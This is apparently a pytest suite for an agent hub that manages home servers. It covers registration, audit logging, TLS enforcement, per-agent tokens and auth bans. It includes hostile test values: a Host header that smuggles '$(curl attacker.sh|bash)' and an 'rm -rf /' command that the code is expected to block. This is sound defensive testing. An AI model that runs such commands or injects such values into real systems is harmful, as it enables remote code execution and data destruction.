from __future__ import annotations

import asyncio
import contextlib
import json
import struct

import pytest

from homepilot.agent_hub.audit import AuditLog
from homepilot.agent_hub.registry import AgentRegistry
from homepilot.agent_hub.server import (
    HEADER_LEN,
    MAX_AUTH_FAILURES,
    MAX_MESSAGE_SIZE,
    RESULT_WAIT_MARGIN,
    AgentCommandError,
    AgentHubServer,
    _encode,
    _is_loopback_bind,
)
from homepilot.agent_hub.tokens import BootstrapTokenStore


@pytest.fixture
def registry():
    return AgentRegistry()


class TestAgentRegistry:
    def test_register_agent(self, registry: AgentRegistry):
        registry.register(
            agent_id="test-1",
            hostname="web01",
            system_info={"os": "linux"},
        )
        agent = registry.get("test-1")
        assert agent is not None
        assert agent.hostname == "web01"
        assert agent.system_info == {"os": "linux"}

    def test_register_and_unregister(self, registry: AgentRegistry):
        registry.register(agent_id="test-2", hostname="db01")
        assert registry.is_connected("db01") is True
        registry.unregister("test-2")
        assert registry.is_connected("db01") is False
        assert registry.get("test-2") is None

    def test_get_by_hostname(self, registry: AgentRegistry):
        registry.register(agent_id="test-3", hostname="cache01")
        agent = registry.get_by_hostname("cache01")
        assert agent is not None
        assert agent.agent_id == "test-3"

    def test_list_connected(self, registry: AgentRegistry):
        registry.register(agent_id="a1", hostname="h1")
        registry.register(agent_id="a2", hostname="h2")
        result = registry.list_connected()
        assert len(result) == 2
        hostnames = {r["hostname"] for r in result}
        assert hostnames == {"h1", "h2"}

    def test_update_heartbeat(self, registry: AgentRegistry):
        registry.register(agent_id="test-hb", hostname="hb01")
        old_hb = registry.get("test-hb").last_heartbeat
        import time

        time.sleep(0.01)
        registry.update_heartbeat("test-hb")
        new_hb = registry.get("test-hb").last_heartbeat
        assert new_hb > old_hb

    def test_update_state(self, registry: AgentRegistry):
        registry.register(agent_id="test-state", hostname="state01")
        registry.update_state("test-state", {"cpu": 45.0, "memory": 72.0})
        agent = registry.get("test-state")
        assert agent.state["cpu"] == 45.0

    def test_unregister_clears_futures(self, registry: AgentRegistry):
        registry.register(agent_id="test-fut", hostname="fut01")
        loop = asyncio.new_event_loop()
        fut = loop.create_future()
        registry.get("test-fut")._result_futures["req-1"] = fut
        registry.unregister("test-fut")
        assert fut.done()


class TestProtocolEncoding:
    def test_encode_decode_roundtrip(self):
        msg = {"action": "exec", "command": "hostname", "request_id": "abc-123"}
        encoded = _encode(msg)
        assert isinstance(encoded, bytes)

        length = struct.unpack("!I", encoded[:HEADER_LEN])[0]
        body = encoded[HEADER_LEN:]
        assert length == len(body)
        decoded = json.loads(body)
        assert decoded == msg


class TestAgentAdapterFallback:
    def test_adapter_error_when_no_connections(self):
        from homepilot.adapters.agent import AgentAdapter, AgentAdapterError

        adapter = AgentAdapter(hub_server=None)
        with pytest.raises(AgentAdapterError, match="no agent connected"):
            asyncio.run(adapter.exec("host1", "hostname"))

    def test_readonly_command_validation(self):
        from homepilot.adapters.agent import AgentAdapter, ReadOnlyCommandError

        adapter = AgentAdapter(hub_server=None)
        with pytest.raises(ReadOnlyCommandError):
            asyncio.run(adapter.exec_readonly("host1", "rm -rf /"))

    def test_guest_host_blocked(self):
        from homepilot.adapters.agent import AgentAdapter, GuestHostError

        adapter = AgentAdapter(hub_server=None, pve_nodes=["pve1"])
        with pytest.raises(GuestHostError):
            asyncio.run(adapter.exec("pve1", "hostname"))


class TestAuditLog:
    def test_log_stores_entry(self):
        audit = AuditLog()
        entry = audit.log(
            agent_id="agent-1",
            action="exec",
            command_or_path="hostname",
            result="success",
            exit_code=0,
        )
        assert entry.agent_id == "agent-1"
        assert entry.action == "exec"
        assert entry.command_or_path == "hostname"
        assert entry.result == "success"
        assert entry.exit_code == 0

    def test_query_returns_entries(self):
        audit = AuditLog()
        audit.log(agent_id="a1", action="exec", command_or_path="ls", result="success", exit_code=0)
        audit.log(agent_id="a2", action="read_file", command_or_path="/etc/hosts", result="success")
        results = audit.query(limit=10)
        assert len(results) == 2
        assert results[0]["agent_id"] == "a1"
        assert results[1]["action"] == "read_file"

    def test_query_respects_limit(self):
        audit = AuditLog()
        for i in range(5):
            audit.log(agent_id=f"a{i}", action="exec", command_or_path=f"cmd{i}", result="success")
        results = audit.query(limit=3)
        assert len(results) == 3
        assert results[-1]["agent_id"] == "a4"

    def test_deque_max_entries(self):
        audit = AuditLog(max_entries=3)
        for i in range(5):
            audit.log(agent_id=f"a{i}", action="exec", command_or_path=f"cmd{i}", result="success")
        results = audit.query(limit=100)
        assert len(results) == 3
        assert results[0]["agent_id"] == "a2"

    def test_clear(self):
        audit = AuditLog()
        audit.log(agent_id="a1", action="exec", command_or_path="ls", result="success")
        audit.clear()
        assert audit.query() == []

    def test_error_result_logged(self):
        audit = AuditLog()
        audit.log(
            agent_id="a1",
            action="write_file",
            command_or_path="/tmp/x",
            result="error",
            exit_code=1,
        )
        results = audit.query()
        assert len(results) == 1
        assert results[0]["result"] == "error"
        assert results[0]["exit_code"] == 1

    def test_blocked_result_logged(self):
        audit = AuditLog()
        audit.log(agent_id="a1", action="exec", command_or_path="rm -rf /", result="blocked")
        results = audit.query()
        assert results[0]["result"] == "blocked"

    def test_registry_has_audit_log(self):
        reg = AgentRegistry()
        assert hasattr(reg, "audit_log")
        assert isinstance(reg.audit_log, AuditLog)


class TestAdvertisedHub:
    """The /agents enrollment endpoints must advertise an address agents can
    actually dial — never the 0.0.0.0 bind address — preferring the operator's
    configured HP_AGENT_HUB_ADVERTISE_HOST."""

    def _req(self, hostname: str = "ui.example.com"):
        from unittest.mock import MagicMock

        req = MagicMock()
        req.url.hostname = hostname
        return req

    def test_prefers_advertise_setting_with_port(self, monkeypatch):
        import homepilot.config as cfg
        from homepilot.agent_hub import router

        s = cfg.get_settings()
        monkeypatch.setattr(s, "agent_hub_advertise_host", "10.0.0.1:9443", raising=False)
        monkeypatch.setattr(cfg, "get_settings", lambda: s)
        host, port = router._advertised_hub(self._req(), "0.0.0.0", 8443)
        assert host == "10.0.0.1"
        assert port == 9443

    def test_advertise_setting_host_only_keeps_bind_port(self, monkeypatch):
        import homepilot.config as cfg
        from homepilot.agent_hub import router

        s = cfg.get_settings()
        monkeypatch.setattr(s, "agent_hub_advertise_host", "10.0.0.1", raising=False)
        monkeypatch.setattr(cfg, "get_settings", lambda: s)
        host, port = router._advertised_hub(self._req(), "0.0.0.0", 8443)
        assert host == "10.0.0.1"
        assert port == 8443

    def test_falls_back_to_request_host_when_bind_wildcard(self, monkeypatch):
        import homepilot.config as cfg
        from homepilot.agent_hub import router

        s = cfg.get_settings()
        monkeypatch.setattr(s, "agent_hub_advertise_host", "", raising=False)
        monkeypatch.setattr(cfg, "get_settings", lambda: s)
        host, port = router._advertised_hub(self._req("hp.lan"), "0.0.0.0", 8443)
        assert host == "hp.lan"
        assert port == 8443

    def test_uses_bind_host_when_not_wildcard(self, monkeypatch):
        import homepilot.config as cfg
        from homepilot.agent_hub import router

        s = cfg.get_settings()
        monkeypatch.setattr(s, "agent_hub_advertise_host", "", raising=False)
        monkeypatch.setattr(cfg, "get_settings", lambda: s)
        host, port = router._advertised_hub(self._req("ui.example.com"), "10.5.5.5", 8443)
        assert host == "10.5.5.5"
        assert port == 8443

    def test_doctored_host_header_not_advertised(self, monkeypatch):
        # Regression (#390): when advertise is unset and the bind host is a
        # wildcard, the resolved host falls back to the client Host header, which
        # is rendered into a `curl … | bash` root one-liner. A doctored Host must
        # NOT appear in the advertised value — a non-executable placeholder is
        # returned instead so the UI can refuse it.
        import homepilot.config as cfg
        from homepilot.agent_hub import router

        s = cfg.get_settings()
        monkeypatch.setattr(s, "agent_hub_advertise_host", "", raising=False)
        monkeypatch.setattr(cfg, "get_settings", lambda: s)
        evil = "evil.example.com/$(curl attacker.sh|bash)"
        host, port = router._advertised_hub(self._req(evil), "0.0.0.0", 8443)
        assert evil not in host
        assert "$(" not in host
        assert host == router._INVALID_HUB_HOST_PLACEHOLDER
        assert port == 8443

    def test_valid_ipv4_request_host_still_advertised(self, monkeypatch):
        # A legitimate hostname/IP from the request must still pass through.
        import homepilot.config as cfg
        from homepilot.agent_hub import router

        s = cfg.get_settings()
        monkeypatch.setattr(s, "agent_hub_advertise_host", "", raising=False)
        monkeypatch.setattr(cfg, "get_settings", lambda: s)
        host, port = router._advertised_hub(self._req("192.168.1.10"), "0.0.0.0", 8443)
        assert host == "192.168.1.10"
        assert port == 8443


class TestRegistryPersistence:
    """Agents must survive a backend restart: register/disconnect/state writes
    go to the agents table (committed), and a second DB connection sees them."""

    @pytest.fixture
    async def db_repo(self, tmp_path):
        from homepilot.db.connection import Database
        from homepilot.db.migrations import run_migrations
        from homepilot.db.repository import Repository

        db = Database(str(tmp_path / "t.db"))
        await db.connect()
        await run_migrations(db)
        yield Repository(db), tmp_path
        await db.close()

    async def test_register_persists_and_survives(self, db_repo):
        repo, tmp_path = db_repo
        reg = AgentRegistry(repo=repo)
        reg.register(agent_id="a-1", hostname="web01", system_info={"os": "Linux"})
        await asyncio.sleep(0)  # let the persistence task run
        await asyncio.sleep(0.05)

        from homepilot.db.connection import Database

        other = Database(str(tmp_path / "t.db"))
        await other.connect()
        rows = await other.fetchall("SELECT agent_id, hostname, connected FROM agents")
        await other.close()
        assert rows and rows[0]["agent_id"] == "a-1"
        assert rows[0]["connected"] == 1

    async def test_unregister_marks_disconnected(self, db_repo):
        repo, _ = db_repo
        reg = AgentRegistry(repo=repo)
        reg.register(agent_id="a-2", hostname="db01")
        await asyncio.sleep(0.05)
        reg.unregister("a-2")
        await asyncio.sleep(0.05)
        agents = await repo.list_agents()
        assert agents[0]["connected"] == 0
        assert agents[0]["disconnected_at"]

    async def test_no_repo_is_noop(self):
        reg = AgentRegistry()
        reg.register(agent_id="a-3", hostname="x")
        reg.unregister("a-3")  # must not raise


class TestDurableTokenHandback:
    """register_ack hands back ONLY a freshly minted per-agent token (#362 slice
    2). The shared fleet token is never returned; a register with no minted token
    carries no ``auth_token`` at all. The ack always carries the protocol
    version + advertised features."""

    def test_ack_includes_minted_token(self):
        from homepilot.agent_hub.server import HUB_FEATURES, PROTOCOL_VERSION, AgentHubServer

        srv = AgentHubServer(auth_token="shared-secret")
        ack = srv._register_ack("agent-1", "req-9", minted_token="minted-per-agent")
        assert ack["action"] == "register_ack"
        assert ack["agent_id"] == "agent-1"
        # The minted per-agent token is handed back — NOT the shared fleet token.
        assert ack["auth_token"] == "minted-per-agent"
        assert ack["auth_token"] != "shared-secret"
        assert ack["v"] == PROTOCOL_VERSION
        assert list(HUB_FEATURES) == ack["features"]

    def test_ack_omits_token_when_none_minted(self):
        from homepilot.agent_hub.server import AgentHubServer

        srv = AgentHubServer(auth_token="shared-secret")
        # No minted token (e.g. a per-agent reconnect) => no auth_token, and the
        # shared fleet token is still never leaked.
        ack = srv._register_ack("agent-1", "req-9")
        assert "auth_token" not in ack


class TestLoopbackDetection:
    def test_loopback_addresses(self):
        assert _is_loopback_bind("127.0.0.1")
        assert _is_loopback_bind("127.5.5.5")
        assert _is_loopback_bind("::1")
        assert _is_loopback_bind("localhost")
        assert _is_loopback_bind("[::1]")

    def test_non_loopback_addresses(self):
        # 0.0.0.0 / :: bind every interface — NOT loopback.
        assert not _is_loopback_bind("0.0.0.0")
        assert not _is_loopback_bind("::")
        assert not _is_loopback_bind("10.0.0.1")
        assert not _is_loopback_bind("192.168.1.5")
        assert not _is_loopback_bind("hub.example.com")
        assert not _is_loopback_bind("")


class TestFailClosedTransport:
    """The hub must refuse to serve credential/command traffic in plaintext on a
    routable interface (issue #362, slice 1)."""

    def test_non_loopback_plaintext_rejected(self):
        srv = AgentHubServer(host="0.0.0.0", port=8443, ssl_context=None)
        with pytest.raises(RuntimeError, match="refusing to start"):
            srv.check_transport_security()

    def test_non_loopback_plaintext_rejected_at_start(self):
        srv = AgentHubServer(host="10.0.0.1", port=8443, ssl_context=None)
        with pytest.raises(RuntimeError, match="TLS is not configured"):
            asyncio.run(srv.start())

    def test_override_allows_plaintext_with_warning(self, caplog):
        srv = AgentHubServer(host="0.0.0.0", port=8443, ssl_context=None, allow_insecure=True)
        with caplog.at_level("WARNING"):
            srv.check_transport_security()  # must not raise
        assert any("WITHOUT TLS" in r.message for r in caplog.records)

    def test_loopback_plaintext_allowed(self):
        # Dev mode: loopback bind, no TLS, no override — allowed, no raise.
        for host in ("127.0.0.1", "localhost", "::1"):
            AgentHubServer(host=host, ssl_context=None).check_transport_security()

    def test_tls_context_allows_non_loopback(self):
        import ssl

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        srv = AgentHubServer(host="0.0.0.0", ssl_context=ctx)
        srv.check_transport_security()  # TLS present — allowed


# NOTE: agent TLS client verification (fail-closed by default, CERT_NONE only via
# HP_AGENT_TLS_INSECURE) is now covered in the canonical Go agent by
# agent/go/config_test.go — the removed Python agent's test lived here before.


# --------------------------------------------------------------------------
# Regression tests for the agent-hub security/robustness wave (#378-#381).
# --------------------------------------------------------------------------

AUTH = "shared-secret"


async def _recv(reader: asyncio.StreamReader) -> dict:
    """Read one length-prefixed JSON frame from a raw stream."""
    hdr = await reader.readexactly(HEADER_LEN)
    (length,) = struct.unpack("!I", hdr)
    body = await reader.readexactly(length)
    return json.loads(body)


class _Hub:
    """A loopback hub plus its client connections, with guaranteed teardown.

    All opened client writers are tracked and closed on exit so a mid-test
    assertion failure cannot leak a socket and hang the event loop."""

    def __init__(self, srv: AgentHubServer, port: int) -> None:
        self.srv = srv
        self.port = port
        self._writers: list[asyncio.StreamWriter] = []

    async def connect(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        reader, writer = await asyncio.open_connection("127.0.0.1", self.port)
        self._writers.append(writer)
        return reader, writer

    async def register(
        self, agent_id: str, hostname: str, token: str = AUTH
    ) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        reader, writer = await self.connect()
        writer.write(
            _encode(
                {
                    "action": "register",
                    "auth_token": token,
                    "agent_id": agent_id,
                    "hostname": hostname,
                    "request_id": f"reg-{agent_id}",
                }
            )
        )
        await writer.drain()
        return reader, writer

    async def aclose(self) -> None:
        for w in self._writers:
            w.close()
            with contextlib.suppress(Exception):
                await w.wait_closed()
        await self.srv.stop()


@contextlib.asynccontextmanager
async def _hub(**kwargs):
    """Start a loopback hub on an OS-assigned port; tear everything down on exit."""
    kwargs.setdefault("auth_token", AUTH)
    srv = AgentHubServer(host="127.0.0.1", port=0, **kwargs)
    await srv.start()
    assert srv._server is not None
    port = srv._server.sockets[0].getsockname()[1]
    hub = _Hub(srv, port)
    try:
        yield hub
    finally:
        await hub.aclose()


class TestRegisterAckNeverLeaksSharedToken:
    """#362 slice 2: the shared fleet token is never handed back on any path —
    per-agent credentials replace it. Only a freshly minted per-agent token is
    ever returned."""

    def test_ack_never_contains_shared_token(self):
        srv = AgentHubServer(auth_token=AUTH)
        # Bootstrap/per-agent reconnect: nothing minted -> no auth_token at all.
        assert "auth_token" not in srv._register_ack("agent-1", "req")
        # Even when a token IS handed back, it is the minted one, not the shared.
        ack = srv._register_ack("agent-1", "req", minted_token="fresh-per-agent")
        assert ack["auth_token"] == "fresh-per-agent"
        assert ack["auth_token"] != AUTH


class TestRegistryIdentity:
    """#379(a/b): compare-and-delete teardown + reject a live identity hijack."""

    def test_unregister_is_compare_and_delete(self, registry: AgentRegistry):
        # Agent A registered under connection "c1"; a reconnect replaced it with "c2".
        registry.register(agent_id="A", hostname="web01", conn_id="c2")
        # The stale "c1" socket closing must NOT evict the reconnected agent.
        registry.unregister("A", conn_id="c1")
        assert registry.get("A") is not None
        # The owning connection can still tear it down.
        registry.unregister("A", conn_id="c2")
        assert registry.get("A") is None

    def test_register_rejects_hostname_held_by_live_agent(self):
        srv = AgentHubServer(auth_token=AUTH)
        reg = srv.registry

        class _LiveWriter:
            def is_closing(self):
                return False

        assert reg.register(agent_id="A", hostname="web01", writer=_LiveWriter(), conn_id="c1")
        # A different agent claiming A's live hostname is refused; A survives.
        assert not reg.register(agent_id="B", hostname="web01", writer=_LiveWriter(), conn_id="c2")
        assert reg.get("A") is not None
        assert reg.get("B") is None
        assert reg.get_by_hostname("web01").agent_id == "A"


class TestHubIntegration:
    """End-to-end over a real loopback socket — the shipped handler path."""

    async def test_reconnect_then_stale_close_keeps_agent(self):
        """#379(a): an old half-open socket closing must not evict the agent that
        already reconnected under a new connection."""
        async with _hub() as h:
            r1, w1 = await h.register("A", "web01")
            assert (await _recv(r1))["action"] == "register_ack"

            r2, _w2 = await h.register("A", "web01")
            assert (await _recv(r2))["action"] == "register_ack"
            await asyncio.sleep(0.05)
            assert h.srv.registry.get("A") is not None

            # The ORIGINAL (now stale) socket closes.
            w1.close()
            await w1.wait_closed()
            await asyncio.sleep(0.05)

            # Reconnected agent is still registered.
            assert h.srv.registry.get("A") is not None

    async def test_send_action_round_trips_params_and_result(self):
        """#397 phase-B1: send_action frames the action+params on the wire and
        returns the agent's structured {changed, detail} result."""
        async with _hub() as h:
            r, w = await h.register("A", "web01")
            assert (await _recv(r))["action"] == "register_ack"

            task = asyncio.create_task(
                h.srv.send_action("A", "install_package", {"name": "nginx"}, timeout=5)
            )
            frame = await _recv(r)
            assert frame["action"] == "install_package"
            assert frame["name"] == "nginx"

            w.write(
                _encode(
                    {
                        "action": "command_result",
                        "request_id": frame["request_id"],
                        "changed": True,
                        "detail": "nginx installed",
                    }
                )
            )
            await w.drain()

            result = await task
            assert result["changed"] is True
            assert result["detail"] == "nginx installed"

    async def test_send_action_error_result_raises(self):
        """An agent-reported error (e.g. path not in allowlist) surfaces as
        AgentCommandError instead of a silent success."""
        async with _hub() as h:
            r, w = await h.register("A", "web01")
            assert (await _recv(r))["action"] == "register_ack"

            task = asyncio.create_task(
                h.srv.send_action(
                    "A",
                    "write_config",
                    {"path": "/nope", "content": "x", "mode": "0644"},
                    timeout=5,
                )
            )
            frame = await _recv(r)
            assert frame["action"] == "write_config"

            w.write(
                _encode(
                    {
                        "action": "command_result",
                        "request_id": frame["request_id"],
                        "error": "path not in allowed write prefixes",
                    }
                )
            )
            await w.drain()

            with pytest.raises(AgentCommandError, match="not in allowed write prefixes"):
                await task

    async def test_send_action_no_agent_raises(self):
        """send_action to an unknown agent raises ConnectionError (not a hang)."""
        async with _hub() as h:
            with pytest.raises(ConnectionError):
                await h.srv.send_action("ghost", "install_package", {"name": "nginx"}, timeout=1)

    async def test_second_connection_claiming_live_hostname_rejected(self):
        """#379(b): a second connection claiming a live agent's hostname is
        rejected and the original stays registered."""
        async with _hub() as h:
            r1, _w1 = await h.register("A", "web01")
            assert (await _recv(r1))["action"] == "register_ack"

            r2, _w2 = await h.register("B", "web01")
            resp = await _recv(r2)
            assert "error" in resp
            await asyncio.sleep(0.05)

            assert h.srv.registry.get("A") is not None
            assert h.srv.registry.get("B") is None
            assert h.srv.registry.get_by_hostname("web01").agent_id == "A"

    async def test_no_connection_gets_the_shared_fleet_token_back(self):
        """#362 slice 2: with no persistence repo wired, neither a bootstrap- nor a
        shared-authed connection ever receives the shared fleet token in its ack
        (per-agent credentials replace it; minting is unavailable without a repo,
        so no token is handed back at all)."""
        store = BootstrapTokenStore()
        boot = store.create_sync()
        async with _hub(token_store=store) as h:
            r1, _w1 = await h.register("boot-agent", "hostb", token=boot)
            ack = await _recv(r1)
            assert ack["action"] == "register_ack"
            assert ack.get("auth_token") != AUTH
            assert "auth_token" not in ack

            r2, _w2 = await h.register("shared-agent", "hosts", token=AUTH)
            ack2 = await _recv(r2)
            assert ack2.get("auth_token") != AUTH
            assert "auth_token" not in ack2

    async def test_oversize_reply_is_per_request_error_agent_survives(self):
        """#380: an oversize command_result returns a clean error to the caller and
        does NOT drop the agent connection."""
        async with _hub() as h:
            r, w = await h.register("A", "web01")
            assert (await _recv(r))["action"] == "register_ack"

            cmd = asyncio.create_task(h.srv.send_command("A", "echo hi", timeout=5))
            exec_frame = await _recv(r)
            assert exec_frame["action"] == "exec"

            # Reply with an oversize command_result carrying the caller's request_id.
            pad = "x" * (MAX_MESSAGE_SIZE + 1024)
            w.write(
                _encode(
                    {
                        "action": "command_result",
                        "request_id": exec_frame["request_id"],
                        "stdout": pad,
                    }
                )
            )
            await w.drain()

            with pytest.raises(AgentCommandError, match="response too large"):
                await cmd

            # The per-request error frame is delivered to the agent too...
            err_frame = await _recv(r)
            assert err_frame["error"] == "response too large"

            # ...and the connection is still alive: a heartbeat round-trips.
            assert h.srv.registry.get("A") is not None
            w.write(_encode({"action": "heartbeat", "request_id": "hb-1"}))
            await w.drain()
            hb = await _recv(r)
            assert hb["action"] == "heartbeat_ack"

    async def test_repeated_bad_tokens_ban_peer(self):
        """#380: consecutive failed registrations from a peer get banned after the
        threshold; a further connection is refused with no frame."""
        async with _hub() as h:
            for i in range(MAX_AUTH_FAILURES):
                r, _w = await h.register(f"x{i}", "h", token="WRONG")
                resp = await _recv(r)
                assert resp["error"] == "invalid auth_token"
            await asyncio.sleep(0.05)
            assert "127.0.0.1" in h.srv._auth_bans

            # A subsequent connection (even with the right token) is dropped
            # immediately without a response frame.
            r2, _w2 = await h.register("y", "h2", token=AUTH)
            with pytest.raises((asyncio.IncompleteReadError, ConnectionError)):
                await _recv(r2)

    async def test_non_dict_frame_is_protocol_error_connection_survives(self):
        """#381: a bare non-object frame yields a protocol error, not a dropped
        connection."""
        async with _hub() as h:
            r, w = await h.register("A", "web01")
            assert (await _recv(r))["action"] == "register_ack"

            # A bare JSON scalar (not an object).
            payload = json.dumps(5).encode("utf-8")
            w.write(struct.pack("!I", len(payload)) + payload)
            await w.drain()
            resp = await _recv(r)
            assert "protocol error" in resp["error"]

            # Connection survives — heartbeat still works.
            w.write(_encode({"action": "heartbeat", "request_id": "hb-2"}))
            await w.drain()
            assert (await _recv(r))["action"] == "heartbeat_ack"

    async def test_zabbix_agent_error_surfaces_as_failure(self):
        """#381: an agent-reported zabbix error is returned as a failure (raises),
        not a silent success, and the result is acked."""
        async with _hub() as h:
            r, w = await h.register("A", "web01")
            assert (await _recv(r))["action"] == "register_ack"

            task = asyncio.create_task(h.srv.send_zabbix_push("A"))
            push = await _recv(r)
            assert push["action"] == "zabbix_push"

            w.write(
                _encode(
                    {
                        "action": "zabbix_push_result",
                        "request_id": push["request_id"],
                        "error": "zabbix send failed",
                    }
                )
            )
            await w.drain()

            with pytest.raises(AgentCommandError, match="zabbix send failed"):
                await task

            ack = await _recv(r)
            assert ack["action"] == "zabbix_ack"


class TestSendCommandTimeout:
    """#380: the caller's timeout is honored, not clamped to the old hardcoded 30."""

    async def test_send_command_honors_passed_timeout(self, monkeypatch):
        from homepilot.agent_hub import server as server_mod

        srv = AgentHubServer(auth_token=AUTH)

        class _StubWriter:
            def write(self, data):
                return None

            async def drain(self):
                return None

            def is_closing(self):
                return False

        srv.registry.register(agent_id="A", hostname="h", writer=_StubWriter())

        captured: dict[str, float] = {}

        async def fake_wait_for(aw, timeout):
            captured["timeout"] = timeout
            if asyncio.iscoroutine(aw):
                aw.close()
            return {"exit_code": 0, "stdout": "ok"}

        monkeypatch.setattr(server_mod.asyncio, "wait_for", fake_wait_for)
        await srv.send_command("A", "echo", timeout=120)
        assert captured["timeout"] == 120 + RESULT_WAIT_MARGIN


# --------------------------------------------------------------------------
# Per-agent credentials + protocol version (#362 slice 2).
# --------------------------------------------------------------------------

from homepilot.agent_hub.server import HUB_FEATURES, PROTOCOL_VERSION  # noqa: E402
from homepilot.agent_hub.tokens import hash_token  # noqa: E402


@contextlib.asynccontextmanager
async def _repo_hub(tmp_path):
    """A loopback hub backed by a real Repository so per-agent credentials can be
    minted, stored, and verified end-to-end on the shipped handler path."""
    from homepilot.db.connection import Database
    from homepilot.db.migrations import run_migrations
    from homepilot.db.repository import Repository

    db = Database(str(tmp_path / "hub.db"))
    await db.connect()
    await run_migrations(db)
    repo = Repository(db)
    reg = AgentRegistry(repo=repo)
    srv = AgentHubServer(host="127.0.0.1", port=0, auth_token=AUTH, registry=reg)
    await srv.start()
    assert srv._server is not None
    port = srv._server.sockets[0].getsockname()[1]
    hub = _Hub(srv, port)
    try:
        yield hub, repo
    finally:
        await hub.aclose()
        await db.close()


async def _register_get_ack(
    hub, agent_id: str, hostname: str, token: str, include_v: bool = True
) -> tuple[asyncio.StreamReader, asyncio.StreamWriter, dict]:
    reader, writer = await hub.connect()
    frame = {
        "action": "register",
        "auth_token": token,
        "agent_id": agent_id,
        "hostname": hostname,
        "request_id": f"reg-{agent_id}",
    }
    if include_v:
        frame["v"] = PROTOCOL_VERSION
    writer.write(_encode(frame))
    await writer.drain()
    ack = await _recv(reader)
    return reader, writer, ack


class TestPerAgentCredentialsE2E:
    """Full socket path: mint on enrollment, reconnect with the minted token,
    protocol version echo, and the shared token never leaking."""

    async def test_shared_first_connect_mints_per_agent_token(self, tmp_path):
        """(a) A first connect with the shared token mints a per-agent token: the
        hash is stored and the raw token is what register_ack returns.

        Revert-check: delete the mint call in _handle_agent (or make
        _mint_agent_credential return None) and the ack loses auth_token and no
        credential row is stored -> fails."""
        async with _repo_hub(tmp_path) as (hub, repo):
            _r, _w, ack = await _register_get_ack(hub, "a1", "host1", AUTH)
            assert ack["action"] == "register_ack"
            minted = ack.get("auth_token")
            assert minted and minted != AUTH
            row = await repo.get_agent_credential("a1")
            assert row is not None
            assert row["credential_hash"] == hash_token(minted)
            assert row["revoked_at"] is None

    async def test_reconnect_with_per_agent_token_not_reminted(self, tmp_path):
        """(b) Reconnecting with the minted per-agent token authenticates and is
        NOT re-minted (ack carries no new token; stored hash unchanged).

        Revert-check: broaden the mint condition to also mint for kind
        'per-agent' and this fails (ack would carry a new token / hash changes)."""
        async with _repo_hub(tmp_path) as (hub, repo):
            _r1, w1, ack1 = await _register_get_ack(hub, "a1", "host1", AUTH)
            minted = ack1["auth_token"]
            row1 = await repo.get_agent_credential("a1")
            w1.close()
            await w1.wait_closed()
            await asyncio.sleep(0.05)

            _r2, _w2, ack2 = await _register_get_ack(hub, "a1", "host1", minted)
            assert ack2["action"] == "register_ack"
            assert "auth_token" not in ack2
            row2 = await repo.get_agent_credential("a1")
            assert row2["credential_hash"] == row1["credential_hash"]

    async def test_register_ack_never_contains_shared_token(self, tmp_path):
        """(e) No register_ack ever contains the shared fleet token — the handed
        back credential is the minted per-agent token, distinct from AUTH."""
        async with _repo_hub(tmp_path) as (hub, _repo):
            _r, _w, ack = await _register_get_ack(hub, "a1", "host1", AUTH)
            assert ack.get("auth_token") != AUTH
            assert AUTH not in ack.values()

    async def test_old_agent_without_version_still_enrolls(self, tmp_path):
        """(f) A register frame with no ``v`` (old agent) still enrolls via the
        shared path and is issued a per-agent credential."""
        async with _repo_hub(tmp_path) as (hub, repo):
            _r, _w, ack = await _register_get_ack(hub, "old1", "hostold", AUTH, include_v=False)
            assert ack["action"] == "register_ack"
            minted = ack.get("auth_token")
            assert minted and minted != AUTH
            assert (await repo.get_agent_credential("old1")) is not None

    async def test_ack_carries_version_and_features(self, tmp_path):
        """(g) register_ack advertises the protocol version and features."""
        async with _repo_hub(tmp_path) as (hub, _repo):
            _r, _w, ack = await _register_get_ack(hub, "a1", "host1", AUTH)
            assert ack["v"] == PROTOCOL_VERSION
            assert "per-agent-creds" in ack["features"]
            assert list(HUB_FEATURES) == ack["features"]


class TestVerifyAuthPerAgent:
    """Direct _verify_auth checks for the bind + revocation rules (deterministic,
    no sockets)."""

    @pytest.fixture
    async def repo_srv(self, tmp_path):
        from homepilot.db.connection import Database
        from homepilot.db.migrations import run_migrations
        from homepilot.db.repository import Repository

        db = Database(str(tmp_path / "v.db"))
        await db.connect()
        await run_migrations(db)
        repo = Repository(db)
        reg = AgentRegistry(repo=repo)
        srv = AgentHubServer(auth_token=AUTH, registry=reg)
        yield srv, repo
        await db.close()

    async def test_per_agent_token_bound_to_identity(self, repo_srv):
        """(c) A per-agent token is rejected when presented from a different
        hostname than it was issued to — with either the right or a wrong
        agent_id. (An id change on the SAME host is a legitimate reconnect and is
        covered by TestCredentialRebindOnIdChange.)

        Revert-check: drop the hostname bind check in _verify_auth and the
        wrong-hostname case wrongly authenticates -> fails."""
        srv, _repo = repo_srv
        minted = await srv._mint_agent_credential("a1", "host1")
        assert minted is not None

        ok = await srv._verify_auth({"auth_token": minted, "agent_id": "a1", "hostname": "host1"})
        assert ok is not None
        assert ok.kind == "per-agent"
        assert ok.agent_id == "a1"

        # Wrong agent_id AND a different hostname: nothing to match -> rejected.
        assert (
            await srv._verify_auth(
                {"auth_token": minted, "agent_id": "attacker", "hostname": "evil-host"}
            )
            is None
        )
        # Right agent_id, wrong hostname: bind check rejects.
        assert (
            await srv._verify_auth(
                {"auth_token": minted, "agent_id": "a1", "hostname": "evil-host"}
            )
            is None
        )

    async def test_revoked_credential_rejected_then_reenroll(self, repo_srv):
        """(d) A revoked credential is rejected; re-enrolling with the shared
        token re-mints and clears the revocation.

        Revert-check: remove the `if row.get("revoked_at"): return None` branch
        and the revoked token wrongly authenticates -> fails."""
        srv, repo = repo_srv
        minted = await srv._mint_agent_credential("a1", "host1")
        assert (
            await srv._verify_auth({"auth_token": minted, "agent_id": "a1", "hostname": "host1"})
        ).kind == "per-agent"

        assert await repo.revoke_agent_credential("a1") is True
        assert (
            await srv._verify_auth({"auth_token": minted, "agent_id": "a1", "hostname": "host1"})
            is None
        )

        # Re-enroll: shared token still authenticates (enrollment path) and a
        # fresh mint clears the revocation.
        res = await srv._verify_auth({"auth_token": AUTH, "agent_id": "a1", "hostname": "host1"})
        assert res is not None and res.kind == "shared"
        minted2 = await srv._mint_agent_credential("a1", "host1")
        assert minted2 != minted
        row = await repo.get_agent_credential("a1")
        assert row["revoked_at"] is None
        assert (
            await srv._verify_auth({"auth_token": minted2, "agent_id": "a1", "hostname": "host1"})
        ).kind == "per-agent"


